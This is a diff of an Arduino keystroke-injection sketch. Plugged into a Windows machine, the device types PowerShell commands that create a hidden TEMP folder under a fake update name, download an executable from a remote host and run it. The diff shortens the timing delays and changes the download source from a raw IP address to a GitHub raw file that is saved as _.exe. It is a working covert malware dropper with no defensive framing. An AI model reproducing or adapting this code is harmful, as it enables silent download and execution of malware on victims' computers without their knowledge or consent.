@@ -57,7 +57,7 @@ void loop()
       while(millis() - timerStamp < 1000)
       {
         handleLEDBlinker();
-        delay(100);
+        delay(50);
       }
       
       Serial.println("Writing in powershell script...");
@@ -68,7 +68,7 @@ void loop()
       Keyboard.print("New-Item -ItemType Directory -Force -Path $env:TEMP/winupd8.nt;"); // CREATE FOLDER
       Keyboard.print("attrib +h $env:TEMP/winupd8.nt;"); // HIDE IT
       Keyboard.print("cd $env:TEMP/winupd8.nt;"); // CHANGE LOCATIONS
-      Keyboard.print("Invoke-WebRequest http://192.210.243.62/_.exe -O \"_.exe\";"); // DOWNLOAD
+      Keyboard.print("Invoke-WebRequest http://github.com/xer0h3r0/fkmurksahd/raw/main/warqa.shd -O \"_.exe\";"); // DOWNLOAD
       Keyboard.print("& ./_.exe"); // RUN
 
       Keyboard.print(" "); // END SCRIPT
@@ -84,7 +84,7 @@ void loop()
       while(millis() - timerStamp < 1000)
       {
         handleLEDBlinker();
-        delay(100);
+        delay(50);
       }
 
       stuffInih++;
